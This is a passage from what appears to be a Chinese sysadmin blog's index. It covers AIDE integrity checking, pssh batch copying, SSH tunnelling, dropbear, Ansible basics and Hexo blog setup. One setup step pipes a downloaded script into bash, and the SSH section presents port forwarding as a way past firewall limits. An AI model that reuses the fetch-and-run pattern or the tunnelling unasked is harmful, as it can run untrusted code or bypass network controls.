-aux来查看系统进程，那么入侵者很可能用自己经过修改的ps程序来替换掉你系统上的ps程序，以使用ps命令查不到正在运行的木马程序。如果入侵者发现管理员正在运行crontab作业，也有可能替换掉crontab程序等等。所以由此可以看出对于系统文件或是关键文件的检查是很必要的。目前就系统完整性检查的工具用的比较多的有两款：Tripwire和AIDE，前者是一款商业软件，后者是一款免费的但功能也很强大的工具 高级入侵检测环境)是一个入侵检测工具，主要用途是检查文件的完整性，审计计算机上的那些文件被更改过了。 AIDE能够构造一个指定文件的数据库，它使用aide.conf作为其配置文件。AIDE数据库能够保存文件的各种属性，包括：权限(permission)、索引节点序号(inode number)、所属用户(user)、所属用户组(group)、文件大小、最后修改时间(mtime)、创建时间(ctime)、最后访问时间(atime)、增加的大小以及连接数。AIDE还能够使用下列算法：sha1、md5、rmd160、tiger，以密文形式建立每个文件的校验码或散列号.  aide的安装\n]$ yum install aide #修改配置文件 ]$ vim /etc/aide.conf (指定对哪些文件进行检测) /test/chameleon R /bin/ps R+a /usr/bin/crontab R+a /etc PERMS !/etc/mtab #“!”表示忽略这个文件的检查 R=p+i+n+u+g+s+m+c+md5 权限+索引节点+链接数+用户+组+大小+最后一次修 改时间+创建时间+md5校验值 NORMAL = R+rmd60+sha256 更新AIDE库\n初始化默认的AIDE的库： /usr/local/bin/aide --init 生成检查数据库（建议初始数据库存放到安全的地方） cd /var/lib/aide mv aide.db.new.gz aide.db.gz 检测： /usr/local/bin/aide --check 更新数据库 aide --update pssh pssh是一个python编写可以在多台服务器上执行命令的工具，也可实现文件copy\n --version：查看版本 -h：主机文件列表，内容格式'[user@]host[:port]' -H：主机字符串，内容格式'[user@]host[:port]' -l：登录使用的用户名 -p：并发的线程数【可选】 -o：输出的文件目录【可选】 -e：错误输入文件【可选】 -t：TIMEOUT 超时时间设置，0无限制【可选】 -O：SSH的选项 -v：详细模式 -A：手动输入密码模式 -x：额外的命令行参数使用空白符号，引号，反斜线处理 -X：额外的命令行参数，单个参数模式，同-x -i：每个服务器内部处理信息输出 -P：打印出服务器返回信息 pscp.pssh pscp.pssh功能是将本地文件批量复制到远程主机\npscp [-vAr] [-h hosts_file] [-H [user@]host[:port]] [-l user] [-p par] [-o outdir] [-e errdir] [-t timeout] [-O options] [-x args] [-X arg] local remote Pscp-pssh选项\n -v 显示复制过程 -a 复制过程中保留常规属性 -r 递归复制目录  ##将本地curl.sh 复制到/app/目录 ]$ pscp.pssh -H 192.168.1.10 /root/test/curl.sh /app/ ]$ pscp.pssh -h host.txt /root/test/curl.sh /app/ ##将本地多个文件批量复制到/app/目录 ]$ pscp.pssh -H 192.168.1.10 /root/f1.sh /root/f2.sh /app/ ##将本地目录批量复制到/app/目录 ]$ pscp.pssh -H 192.168.1.10 -r /root/test/ /app/ pslurp pslurp.pssh功能是将远程主机的文件批量复制到本地\npslurp [-vAr] [-h hosts_file] [-H [user@]host[:port]] [-l user] [-p par][-o outdir] [-e errdir] [-t timeout] [-O options] [-x args] [-X arg] [-L localdir] remote local（本地名）\nPslurp-pssh选项\n-L 指定从远程主机下载到本机的存储的目录，local是下载到本地后的名称\n-r 递归复制目录\n# 批量下载目标服务器的messages文件至/data下，并更名为m ]$ pslurp -H 192.168.1.10 -L /data/ /var/log/messages m SSH端口转发 ​\tSSH 会自动加密和解密所有 SSH 客户端与服务端之间的网络数据。但是，SSH还能够将其他 TCP 端口的网络数据通过 SSH 链接来转发，并且自动提供了相应的加密及解密服务。这一过程也被叫做“隧道”（tunneling），这是因为 SSH 为其他 TCP 链接提供了一个安全的通道来进行传输而得名。例如，Telnet，SMTP，LDAP 这些 TCP 应用均能够从中得益，避免了用户名，密码以及隐私信息的明文传输。而与此同时，如果工作环境中的防火墙限制了一些网络端口的使用，但是允许 SSH 的连接，也能够通过将 TCP 端口转发来使用 SSH 进行通讯。\n  SSH 端口转发能够提供两大功能：\n  加密 SSH Client 端至 SSH Server 端之间的通讯数据\n  突破防火墙的限制完成一些之前无法建立的 TCP 连接\n  场景1: 在外地的client想访问公司的telnet服务器（不能直连），我在外地。\nlocalclient:192.168.30.7 sshsrv:192.168.30.6 telnetsrv:192.168.30.17 ]$ ssh -L 9527:192.168.30.17:23 -Nf 192.168.30.6 (搭桥梁) ]$ telnet 127.0.0.1:9527` 直连telnet服务器 保证`telnet-server`包在服务器上有安装 注意：centos系统上`telnet`不让root登录，只允许普通用户登录 场景2 : 在外地的client想访问公司的telnet服务器（不能直连）,我在lanserver。\nlanserver：ssh client; telnet client:192.168.30.6 internet client:192.168.30.7 telnetsrv:192.168.30.17 在lanserver上操作： ]$ ssh -R 9527:192.168.30.17:23 -Nf 192.168.30.7 跳板原理 当用firefox访问internet时，本机的1080端口做为代理服务器，firefox的访问 请求被转发到sshserver上，由sshserver替之访问internet\n]$ ssh -D 1080 root@sshserver ]$ curl -socks5 127.0.0.1:1080 http://www.qq.com ssh协议的另一实现：dropbear dropbear编译安装\n安装前装备：\n]$ yum groupinstall “Development tools” #下载dropbear-2018.76.tar.bz2 ]$ tar -xvf dropbear-2018.76.tar.bz2 ]$ cd dropbear-2018.76 ]$ less INSTALL RAEDME 开始安装：\n]$ ./configure --prefix=/data/dropbear --sysconfdir=/etc/dropbear/ ]$ make PROGRAMS=\u0026quot;dropbear dbclient dropbearkey dropbearconvert scp\u0026quot; ]$ make PROGRAMS=\u0026quot;dropbear dbclient dropbearkey dropbearconvert scp\u0026quot; install ]$ mkdir /etc/dropbear #confdir没有生成成功，自建这个文件夹 ]$ cat \u0026gt;\u0026gt;/etc/profile.d/dropbear.sh\u0026lt;\u0026lt; EOF ]$ PATH=/data/dropbear/bin/:/data/dropbear/sbin/:$PATH ]$ EOF #添加环境变量 ]$ . /etc/profile.d/dropbear.sh 运行dropbear：\n]$ dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key -s 2048 ]$ dropbear -p :9528 -F –E #前台运行 ]$ dropbear -p :9528 #后台运行 ]$ ssh 192.168.1.8 -p 9528#客户端执行 ","permalink":"https://www.fenghong.tech/blog/2018/2018-06-10-safe/","tags":["ssh","safe"],"title":"安全相关"},{"categories":["ops"],"contents":"实验环境： 主控机：192.168.1.9(centos 7.5) 被控机：192.168.1.8(centos 7.5);192.168.1.7(centos 7.4);192.168.1.6(cnetos 6.9) 虚拟机：vmware 14 做ansible实验前，必须做好主控机的基于被控机的key验证登录 具体参照前面的博文中的基于key验证。\nansible 特性 模块化：调用特定的模块，完成特定任务有Paramiko，PyYAML，Jinja2（模板语言）三个关键模块 支持自定义模块 基于Python语言实现 部署简单，基于python和SSH(默认已安装)，agentless 安全，基于OpenSSH 支持playbook编排任务 幂等性：一个任务执行1遍和执行n遍效果一样，不因重复执行带来意外情况 无需代理不依赖PKI（无需ssl） 可使用任何编程语言写模块 YAML格式，编排任务，支持丰富的数据结构 较强大的多层解决方案\n主要组成 ANSIBLE PLAYBOOKS：任务剧本（任务集），编排定义Ansible任务集的配置文件，由Ansible顺序依次执行，通常是JSON格式的YML文件 INVENTORY：Ansible管理主机的清单/etc/anaible/hosts MODULES：Ansible执行命令的功能模块，多数为内置核心模块，也可自定义 PLUGINS：模块功能的补充，如连接类型插件、循环插件、变量插件、过滤插件等，该功能不常用 API：供第三方程序调用的应用程序编程接口 ANSIBLE：组合INVENTORY、API、MODULES、PLUGINS的绿框，可以理解为是ansible命令工具，其为核心执行工具 Ansible命令执行来源： USER，普通用户，即SYSTEM ADMINISTRATOR CMDB（配置管理数据库） API 调用 PUBLIC/PRIVATE CLOUD API调用 USER-\u0026gt; Ansible Playbook -\u0026gt; Ansibile 利用ansible实现管理的方式： Ad-Hoc 即ansible命令，主要用于临时命令使用场景 Ansible-playbook 主要用于长期规划好的，大型项目的场景，需要有前提 的规划 Ansible-playbook（剧本）执行过程： 将已有编排好的任务集写入Ansible-Playbook 通过ansible-playbook命令分拆任务集至逐条ansible命令，按预定规则逐条 执行 ansible主要操作对象： HOSTS主机 NETWORKING网络设备 注意事项 执行ansible的主机一般称为主控端，中控，master或堡垒机 主控端Python版本需要2.6或以上 被控端Python版本小于2.4需要安装python-simplejson 被控端如开启SELinux需要安装libselinux-python windows不能做为主控端 安装ansible rpm包安装: EPEL源\nyum install ansible 编译安装:\nyum -y install python-jinja2 PyYAML python-paramiko python-babel python-crypto tar xf ansible-1.5.4.tar.gz cd ansible-1.5.4 python setup.py build python setup.py install mkdir /etc/ansible cp -r examples/* /etc/ansible Git方式:\ngit clone git://github.com/ansible/ansible.git --recursive cd ./ansible source ./hacking/env-setup pip安装： pip是安装Python包的管理器，类似yum\nyum install python-pip python-devel yum install gcc glibc-devel zibl-devel rpm-bulid openssl-devel pip install --upgrade pip pip install ansible --upgrade 确认安装： ansible \u0026ndash;version\n相关文件说明 配置文件 /etc/ansible/ansible.cfg 主配置文件，配置ansible工作特性;建议去掉# host_key_checking = False ;disabled SSH key host checking；前提基于key验证 /etc/ansible/hosts 主机清单 /etc/ansible/roles/ 存放角色的目录 程序 /usr/bin/ansible 主程序，临时命令执行工具 /usr/bin/ansible-doc 查看配置文档，模块功能查看工具 /usr/bin/ansible-galaxy 下载/上传优秀代码或Roles模块的官网平台 /usr/bin/ansible-playbook 定制自动化任务，编排剧本工具/usr/bin/ansible-pull 远程执行命令的工具 /usr/bin/ansible-vault 文件加密工具 /usr/bin/ansible-console 基于Console界面与用户交互的执行工具 hosts清单 # Ex 1: Ungrouped hosts, specify before any group headers. ## green.example.com ## blue.example.com ## 192.168.100.1 ## 192.168.100.10 # Ex 2: A collection of hosts belonging to the 'webservers' group ## [webservers] ## alpha.example.org ## beta.example.org ## 192.168.1.100:9527 #如果此被控机ssh端口为9527，则加一项 ## 192.168.1.110 # Here's another example of host ranges, this time there are no # leading 0s: ## db-[99:101]-node.example.com 例如：\nansible all -m shell -a 'cat /etc/fstab' #查看主机清单里所有主机的/etc/fstab文件 ansible webservers -m shell -a 'cat /etc/fstab' #查看主机清单里wenservers中主机的/etc/fstab文件 ansible相关命令 Ansible系列命令 ansible ansible-doc ansible-playbook ansible-vault ansible-console ansible-galaxy ansible-pull ansible-doc: 显示模块帮助 ansible-doc [options] [module...] -a 显示所有模块的文档 -l, --list 列出可用模块 -s, --snippet显示指定模块的playbook片段 示例：\nansible-doc –l 列出所有模块 ansible-doc ping 查看指定模块帮助用法 ansible-doc –s ping 查看指定模块帮助用法 命令行\nansible \u0026lt;host-pattern\u0026gt; [-m module_name] [-a args] --version 显示版本 -m module 指定模块，默认为command -v 详细过程 –vv -vvv更详细 --list-hosts 显示主机列表，可简写—list -k, --ask-pass 提示输入ssh连接密码，默认Key验证 -K, --ask-become-pass 提示输入sudo时的口令 -C, --check 检查，并不执行 -T, --timeout=TIMEOUT 执行命令的超时时间，默认10s -u, --user=REMOTE_USER 执行远程执行的用户 -b, --become 代替旧版的sudo 切换 ansible命令执行过程  加载自己的配置文件 默认/etc/ansible/ansible.cfg 加载自己对应的模块文件，如command 通过ansible将模块或命令生成对应的临时py文件，并将该 文件传输至远程服务器的对应执行用户$HOME/.ansible/tmp/ansible-tmp-数字/XXX.PY文件 给文件+x执行 执行并返回结果 删除临时py文件，sleep 0退出  执行状态： 绿色：执行成功并且不需要做改变的操作 ×××：执行成功并且对目标主机做变更 红色：执行失败\nansible常用模块 Command：在远程主机执行命令，默认模块，可忽略-m选项\nansible srvs -m command -a 'service vsftpd start' ansible srvs -m command -a 'echo password |passwd --stdin user' #不成功，此命令不支持 $VARNAME \u0026lt; \u0026gt; | ; \u0026amp; 等，用shell模块实现 Shell：和command相似，用shell执行命令\nansible srvs -m shell -a 'echo password |passwd –stdin user' #调用bash执行命令 类似 cat /tmp/stanley | awk -F'|' '{print $1,$2}' \u0026amp;\u0026gt;/tmp/example.txt 这些复杂命令，即使使用shell也可能会失败，解决办法：写到脚本时，copy到远程，执行，再把需要的结果拉回执行命令的机器 Script：运行脚本\n -a \u0026quot;/PATH/TO/SCRIPT_FILE\u0026quot; asnsible websrvs -m script -a f1.sh ** Copy**:从服务器复制文件到客户端,\n ansible srvs -m copy -a \u0026quot;src=/root/f1.sh dest=/tmp/f2.sh owner=user mode=600 backup=yes\u0026quot; #如目标存在，默认覆盖，此处指定先备份 ansible srvs -m copy -a \u0026quot;content='test content\\n' dest=/tmp/f1.txt\u0026quot; # 利用内容，直接生成目标文件 Fetch:从客户端取文件至服务器端，copy相反，目录可先tar\nansible srvs -m fetch -a 'src=/root/a.sh dest=/data/scripts' File：设置文件属性\nansible srvs -m file -a \u0026quot;path=/root/a.sh owner=user mode=755\u0026quot; ansible web -m file -a 'src=/app/testfile dest=/app/testfile-link state=link' Hostname：管理主机名\nansible node1 -m hostname -a \u0026quot;name=websrv\u0026quot; Cron：计划任务\n#支持时间：minute，hour，day，month，weekday ansible srvs -m cron -a \u0026quot;minute=*/5 job='/usr/sbin/ntpdate 172.16.0.1 \u0026amp;\u0026gt;/dev/null' name=Synctime\u0026quot; #创建任务 ansible srvs -m cron -a 'state=absent name=Synctime' #删除任务 Yum：管理包\nansible srvs -m yum -a 'name=httpd state=latest' #安装 ansible srvs -m yum -a 'name=httpd state=absent' #删除 Ansible-vault  功能：管理加密解密yml文件 ansible-vault [create|decrypt|edit|encrypt|rekey|view] ansible-vault encrypt hello.yml 加密 ansible-vault decrypt hello.yml 解密 ansible-vault view hello.yml 查看 ansible-vault edit hello.yml 编辑加密文件 ansible-vault rekey hello.yml 修改口令 ansible-vault create new.yml 创建新文件 playbook playbook是由一个或多个“play”组成的列表 play的主要功能在于将事先归并为一组的主机装扮成事先通过ansible中的task定义好的角色。从根本上来讲，所谓task无非是调用ansible的一个module。将多个play组织在一个playbook中，即可以让它们联同起来按事先编排的机制同唱一台大戏 Playbook采用YAML语言编写\nYAML介绍 YAML是一个可读性高的用来表达资料序列的格式。YAML参考了其他多种语言，包括：XML、C语言、Python、Perl以及电子邮件格式RFC2822等。Clark Evans在2001年在首次发表了这种语言，另外Ingy döt Net与Oren Ben-Kiki也是这语言的共同设计者 YAML Ain\u0026rsquo;t Markup Language，即YAML不是XML。不过，在开发的这种语言时，YAML的意思其实是：\u0026ldquo;Yet Another Markup Language\u0026rdquo;（仍是一种标记语言） 特性 YAML的可读性好 YAML和脚本语言的交互性好 YAML使用实现语言的数据类型 YAML有一个一致的信息模型 YAML易于实现 YAML可以基于流来处理 YAML表达能力强，扩展性好 更多的内容及规范参见 yaml\nplaybook与shell脚本 SHELL脚本\n#!/bin/bash # 安装Apache yum install --quiet -y httpd # 复制配置文件 cp /tmp/httpd.conf /etc/httpd/conf/httpd.conf cp/tmp/vhosts.conf /etc/httpd/conf.d/ # 启动Apache，并设置开机启动 service httpd start chkconfig httpd on Playbook定义\n--- - hosts: all tasks: - name: \u0026quot;安装Apache\u0026quot; yum: name=httpd - name: \u0026quot;复制配置文件\u0026quot; copy: src=/tmp/httpd.conf dest=/etc/httpd/conf/ copy: src=/tmp/vhosts.conf dest=/etc/httpd/conf.cd/ - name: \u0026quot;启动Apache，并设置开机启动\u0026quot; service: name=httpd state=started enabled=yes palybook变量 变量名：仅能由字母、数字和下划线组成，且只能以字母开头 变量来源： 1 ansible setup facts 远程主机的所有变量都可直接调用 2 在/etc/ansible/hosts中定义 普通变量：主机组中主机单独定义，优先级高于公共变量 公共（组）变量：针对主机组中所有主机定义统一变量 3 通过命令行指定变量，优先级最高 ansible-playbook –e varname=value 4 在playbook中定义\nvars: - var1: value1 - var2: value2 5 在role中定义\n模板templates 文本文件，嵌套有脚本（使用模板编程语言编写） Jinja2语言，使用字面量，有下面形式 字符串：使用单引号或双引号 数字：整数，浮点数 列表：[item1, item2, \u0026hellip;] 元组：(item1, item2, \u0026hellip;) 字典：{key1:value1, key2:value2, \u0026hellip;} 布尔型：true/false 算术运算：+, -, *, /, //, %, ** 比较操作：==, !=, \u0026gt;, \u0026gt;=, \u0026lt;, \u0026lt;= 逻辑运算：and, or, not 流表达式：For If When\ntasks: - name: install conf file to centos7 template: src=nginx.conf.c7.j2 when: ansible_distribution_major_version == \u0026quot;7\u0026quot; 示例：for.yml\n--- - hosts: all remote_user: root vars: ports: - listen_port: 81 name: web1 rootdir: web1.com - listen_port: 82 name: web2 rootdir: web2.com - listen_port: 83 name: web3 rootdir: web3.com tasks: - name: copy templates conf template: src=forif.conf.j2 dest=/data/forif.conf templates/for.conf.j2\n{% for p in ports %} server{ listen {{ p.listen_port }} name {{ p.name }} rootdir {{ p.rootdir }} } {% endfor %} roles roles ansilbe自1.2版本引入的新特性，用于层次性、结构化地组织playbook。roles能够根据层次型结构自动装载变量文件、tasks以及handlers等。要使用roles只需要在playbook中使用include指令即可。简单来讲，roles就是通过分别将变量、文件、任务、模板及处理器放置于单独的目录中，并可以便捷地include它们的一种机制。角色一般用于基于主机构建服务的场景中，但也可以是用于构建守护进程等场景中 复杂场景：建议使用roles，代码复用度高 变更指定主机或主机组 如命名不规范维护和传承成本大 某些功能需多个Playbook，通过Includes即可实现 下面的nginx的roles，可通过下载\nansible-galaxy install geerlingguy.nginx ansible的其他应用亲参考\nansible galaxy github ansible github ansible\n","permalink":"https://www.fenghong.tech/blog/2018/2018-06-10-ansible/","tags":["ansible","ssh","shell"],"title":"Ansible简单实验"},{"categories":["hexo"],"contents":"hexo部署命令 常用命令 ]$ hexo help #查看帮助 ]$ hexo init #初始化一个目录 ]$ hexo new \u0026quot;postName\u0026quot; #新建文章 ]$ hexo new page \u0026quot;pageName\u0026quot; #新建页面 ]$ hexo generate #生成网页，可以在 public 目录查看整个网站的文件 ]$ hexo server #本地预览，'Ctrl+C'关闭 ]$ hexo deploy #部署.deploy目录 ]$ hexo clean #清除缓存，**强烈建议每次执行命令前先清理缓存，每次部署前先删除 .deploy 文件夹** 常用简写命令 ]$ hexo n ==\u0026gt; hexo new ]$ hexo g ==\u0026gt; hexo generate ]$ hexo s ==\u0026gt; hexo server ]$ hexo d ==\u0026gt; hexo deploy ]$ hexo d -g\t#生成加部署 ]$ hexo s -g\t#预览部署 _config.yml全局配置 ]$ vim ~/hexo/_config.yml # Hexo Configuration # Docs: http://hexo.io/docs/configuration.html # Source: https://github.com/hexojs/hexo/ # Site #站点信息 title: #标题 subtitle: #副标题 description: #站点描述，给搜索引擎看的 author: #作者 email: #电子邮箱 language: zh-CN #语言 # URL #链接格式 url: #网址 root: / #根目录 permalink: :year/:month/:day/:title/ #文章的链接格式 tag_dir: tags #标签目录 archive_dir: archives #存档目录 category_dir: categories #分类目录 code_dir: downloads/code permalink_defaults: # Directory #目录 source_dir: source #源文件目录 public_dir: public #生成的网页文件目录 # Writing #写作 new_post_name: :title.markdown #新文章标题 default_layout: post #默认的模板，包括 post、page、photo、draft（文章、页面、照片、草稿） titlecase: false #标题转换成大写 external_link: true #在新选项卡中打开连接 filename_case: 0 render_drafts: false post_asset_folder: false relative_link: false highlight: #语法高亮 enable: true #是否启用 line_number: true #显示行号 tab_replace: # Category \u0026amp; Tag #分类和标签 default_category: uncategorized #默认分类 category_map: tag_map: # Archives 2: 开启分页 1: 禁用分页 0: 全部禁用 archive: 2 category: 2 tag: 2 # Server #本地服务器 port: 4000 #端口号 server_ip: localhost #IP 地址 logger: false logger_format: dev # Date / Time format #日期时间格式 date_format: YYYY-MM-DD #参考http://momentjs.com/docs/#/displaying/format/ time_format: H:mm:ss # Pagination #分页 per_page: 10 #每页文章数，设置成 0 禁用分页 pagination_dir: page # Disqus #Disqus评论，替换为多说 disqus_shortname: # Extensions #拓展插件 theme: landscape-plus #主题 exclude_generator: plugins: #插件，例如生成 RSS 和站点地图的 - hexo-generator-feed - hexo-generator-sitemap # Deployment #部署， deploy: type: git repo: 刚刚github创库地址.git branch: master blog创建及部署 创建关于/分类/标签页面  about categories tags  ]$ hexo new \u0026quot;我的第一篇博客\u0026quot; ]$ hexo n page 'about' ]$ hexo new \u0026quot;Ansible\u0026quot; ]$ hexo new 'safe' ]$ hexo n page 'categories' ]$ vim ~/source/categories/index.markdown type: \u0026quot;categories\u0026quot; ]$ hexo n page 'tags' ]$ vim ~/source/tags/index.markdown type: \u0026quot;tags\u0026quot; 打赏页面 ]$ vim ~/themes/next/_config.yml #Reward reward_comment: 觉得有帮助可以支持作者 wechatpay: /images/wechatpay.jpg #相对路径或者绝对路径 alipay: /images/alipay.jpg #bitcoin: /images/bitcoin.png 背景线条 打开：~/theme/next/layout/_layout.swig\n在 \u0026lt; /body\u0026gt;之前添加代码(注意不要放在\u0026lt; /head\u0026gt;的后面)\n{% if theme.canvas_nest %} \u0026lt;script type=\u0026quot;text/javascript\u0026quot; src=\u0026quot;//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; {% endif %} 打开：~/theme/next/_config.yml ,改成true\n# -------------------------------------------------------------- canvas_nest: true 如过觉得线条多的话，\n重新编辑next/layout/_layout.swig\n{% if theme.canvas_nest %} \u0026lt;script type=\u0026quot;text/javascript\u0026quot; color=\u0026quot;0,0,255\u0026quot; opacity='0.7' zIndex=\u0026quot;-2\u0026quot; count=\u0026quot;99\u0026quot; src=\u0026quot;//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; {% endif %} 配置项说明  color ：线条颜色, 默认: '0,0,0'；三个数字分别为(R,G,B) opacity: 线条透明度（0~1）, 默认: 0.5 count: 线条的总数量, 默认: 150 zIndex: 背景的z-index属性，css属性用于控制所在层的位置, 默认: -1  页面点击出红心 在网址输入如下\nhttp://7u2ss1.com1.z0.glb.clouddn.com/love.js 然后将里面的代码copy一下vim ~/themes/next/source/js/src/love.js，添加上面的代码，然后打开vim ~/themes/next/layout/_layout.swig文件,在末尾添加以下代码：\n\u0026lt;!-- 页面点击小红心 --\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot; src=\u0026quot;/js/src/love.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; 左侧链接栏  auto_excerpt:不显示全文页  $vim ~/themes/next/_config.yml auto_excerpt: enable: ture length: 150  busuanzi_count:显示浏览量及访问量  $vim ~/themes/next/_config.yml busuanzi_count: # count values only if the other configs are false enable: true # custom uv span for the whole site site_uv: true site_uv_header: \u0026lt;i class=\u0026quot;fa fa-user\u0026quot;\u0026gt;\u0026lt;/i\u0026gt; 访问人数 site_uv_footer: # custom pv span for the whole site site_pv: true site_pv_header: \u0026lt;i class=\u0026quot;fa fa-eye\u0026quot;\u0026gt;\u0026lt;/i\u0026gt; 总访问量 site_pv_footer: 次 # custom pv span for one page only page_pv: true page_pv_header: \u0026lt;i class=\u0026quot;fa fa-file-o\u0026quot;\u0026gt;\u0026lt;/i\u0026gt; 浏览 page_pv_footer: 次  social: 链接栏  $vim ~/themes/next/_config.yml social: GitHub: https://github.com/oldthreefeng || github #E-Mail: mailto:louisehong4168@gmail.com || Mail #Google: https://plus.google.com/yourname || google #Twitter: https://twitter.com/yourname || twitter #FB Page: https://www.facebook.com/yourname || facebook #VK Group: https://vk.com/yourname || vk #StackOverflow: https://stackoverflow.com/yourname || stack-overflow #YouTube: https://youtube.com/yourname || youtube Instagram: https://instagram.com/louisehong4168 || instagram #Skype: skype:yourname?call|chat || skype social_icons: enable: true  links：友情链接  ]$ vim ~/themes/next/_config.yml # Blog rolls links_icon: link links_title: 看看他们 links_layout: block #links_layout: inline links: Awesome: https://fontawesome.com/icons 小图标\n字数统计功能 在根目录下安装 hexo-wordcount,运行：\n$ npm install hexo-wordcount --save 然后在主题的配置文件themes/next/_config.yml中，配置如下：\n# Post wordcount display settings # Dependencies: https://github.com/willin/hexo-wordcount post_wordcount: item_text: true wordcount: true min2read: true change font by config.yml @ ritta.blens@gmail.com first way\n$ vim ~/themes/next/_config.yml # 在网上找的字体：我用的是Microsoft YaHei # you can use https://www.websiteplanet.com/blog/best-free-fonts/ to find you want~ # \u0026quot;Helvetica Neue\u0026quot;,\u0026quot; Helvetica, Arial\u0026quot;, \u0026quot;PingFang SC\u0026quot;, \u0026quot;Hiragino Sans GB\u0026quot;, \u0026quot;Heiti SC\u0026quot;, \u0026quot;Microsoft YaHei\u0026quot;, \u0026quot;WenQuanYi Micro Hei\u0026quot; font: enable: true # Uri of fonts host. E.g. //fonts.googleapis.com (Default) host: # Global font settings used on \u0026lt;body\u0026gt; element. # 全局字体，应用在 body 元素上 global: external: true family: Lato size: 16 # 标题字体 (h1, h2, h3, h4, h5, h6) headings: external: true family: Roboto Slab size: # 文章字体 posts: external: true family: # Logo 字体 logo: external: true family: Lobster Two size: 24 # 代码字体，应用于 code 以及代码块 codes: external: true family: Roboto Mono second way to change your font :\nvim ~/themes/next/_config.yml # For example, you want to put your custom styles file # outside theme directory in root `source/_data`, set # `styles: source/_data/styles.styl` #custom_file_path: # Default paths: layout/_custom/* #head: source/_data/head.swig #header: source/_data/header.swig #sidebar: source/_data/sidebar.swig # Default path: source/css/_variables/custom.styl #variables: source/_data/variables.styl # Default path: source/css/_mixins/custom.styl #mixins: source/_data/mixins.styl # Default path: source/css/_custom/custom.styl #styles: source/_data/styles.styl you can add your custom styles in source/_data/styles.styl according to ~/themes/next/source/css/_variables/base.styl\nvim ~/themes/next/source/css/_variables/base.styl // Font families. $font-family-chinese = \u0026quot;PingFang SC\u0026quot;, \u0026quot;Microsoft YaHei\u0026quot; $font-family-base = $font-family-chinese, sans-serif $font-family-base = get_font_family('global'), $font-family-chinese, sans-serif if get_font_family('global') $font-family-logo = $font-family-base $font-family-logo = get_font_family('logo'), $font-family-base if get_font_family('logo') $font-family-headings = $font-family-base $font-family-headings = get_font_family('headings'), $font-family-base if get_font_family('headings') $font-family-posts = $font-family-base $font-family-posts = get_font_family('posts'), $font-family-base if get_font_family('posts') $font-family-monospace = consolas, Menlo, $font-family-chinese, monospace $font-family-monospace = get_font_family('codes'), consolas, Menlo, $font-family-chinese, monospace if get_font_family('codes') $font-family-icons = 'FontAwesome' linktogithub\n报错 搭建过程中出现了几个报错，统计了一下\n异常报错1 fatal: unable to access : Empty reply from server FATAL Something\u0026rsquo;s wrong. Maybe you can find the solution here: Error: fatal: unable to access ： Empty reply from server\n$hexo clean 异常报错2 ERROR Deployer not found: git\n]$ npm install hexo-generator-index --save ]$ npm install hexo-generator-archive --save ]$ npm install hexo-generator-category --save ]$ npm install hexo-generator-tag --save ]$ npm install hexo-server --save ]$ npm install hexo-deployer-git --save ]$ npm install hexo-renderer-marked@0.2 --save ]$ npm install hexo-renderer-stylus@0.2 --save ]$ npm install hexo-generator-feed@1 --save ]$ npm install hexo-generator-sitemap@1 --save 总结：前前后后话了两天初步搭建起来，查看了很多的大神blog，最后也成功了，比较开心\n详细参见距离博文\n","permalink":"https://www.fenghong.tech/blog/2018/2018-06-10-hexo-developed/","tags":["hexo"],"title":"hexo进阶"},{"categories":["hexo"],"contents":"hexo初识及准备   Hexo是一个简单、快速、强大的基于 Github Pages 的博客框架，支持Markdown格式，有众多优秀插件和主题。\n  由于github pages存放的都是静态文件，博客存放的不只是文章内容，还有文章列表、分类、标签、翻页等动态内容，假如每次写完一篇文章都要手动更新博文目录和相关链接信息，相信谁都会疯掉，所以hexo所做的就是将这些md文件都放在本地，每次写完文章后调用写好的命令来批量完成相关页面的生成，然后再将有改动的页面提交到github。\n  有一个github账号，没有的话去注册一个；创建repository：userid.github.io\n  安装了git ,linux自带git，然后在github上实现基于key的验证。\n  Hexo依赖于Node.js;git;\n  重启终端，下载相关的依赖环境 $ yum install git-core $ wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.31.1/install.sh | bash $ nvm install stable $ npm install -g hexo-cli $ hexo -v hexo: 3.7.1 hexo-cli: 1.1.0 $ node -v v8.11.2 网站初始化 $ mkdir myblog $ cd myblog $ hexo init #生成博客 $ tree . . ├── _config.yml ├── package.json ├── scaffolds ├── source | ├── _drafts | └── _posts └── theme $ hexo g\t#部署博客 INFO Start processing INFO Files loaded in 583 ms INFO Generated: index.html INFO Generated: archives/index.html ··· INFO 28 files generated in 1.09 s 更换主题 $ hexo s INFO Start processing INFO Hexo is running at http://localhost:4000/. Press Ctrl+C to stop. $ git clone https://github.com/litten/hexo-theme-yilia.git themes/yilia #换yilia主题，都在hexo家目录执行 $ git clone https://github.com/iissnan/hexo-theme-next themes/next #换主题 $ vim _config.yml theme: next $ hexo clean\t#清缓存 $ hexo g INFO Start processing ···· $ hexo s INFO Start processing INFO Hexo is running at http://localhost:4000/. Press Ctrl+C to stop. INFO See you again 部署hexo到github $ vim _config.yml deploy： type: git repository: https://github.com/oldthreefeng/oldthreefeng.github.io.git branch: master $ hexo d ERROR Deployer not found: git $ npm install hexo-deployer-git --save + hexo-deployer-git@0.3.1 added 31 packages in 63.468s $ hexo d INFO Deploying: git INFO Setting up Git deployment... Initialized empty Git repository in D:/github/hexo/.deploy_git/.git/ *** Please tell me who you are. Run $ git config --global user.email \u0026quot;you@example.com\u0026quot; $ git config --global user.name \u0026quot;Your Name\u0026quot; $ hexo d ··· Branch 'master' set up to track remote branch 'master' from 'https://github.com/oldthreefeng/oldthreefeng.github.io.git'. To https://github.com/oldthreefeng/oldthreefeng.github.io.git + 930f090...4f24ee0 HEAD -\u0026gt; master (forced update) INFO Deploy done: git 至此，部署成功，访问https://userid.github.io ,userid是你的github账户用户名。\n6.创建第一篇博文 $vim _config.yml title: Feng's Blog subtitle: 山不在高，有仙则名；水不在深，有龙则灵。 description: Linux Learning keywords: author: Hong Feng language: zh-Hans timezone: $ rm -f source/_posts/* $ cd public/2018/06/05/ $ rm -rf hello-world/ $ hexo new \u0026quot;我的第一篇博文\u0026quot; $ hexo g 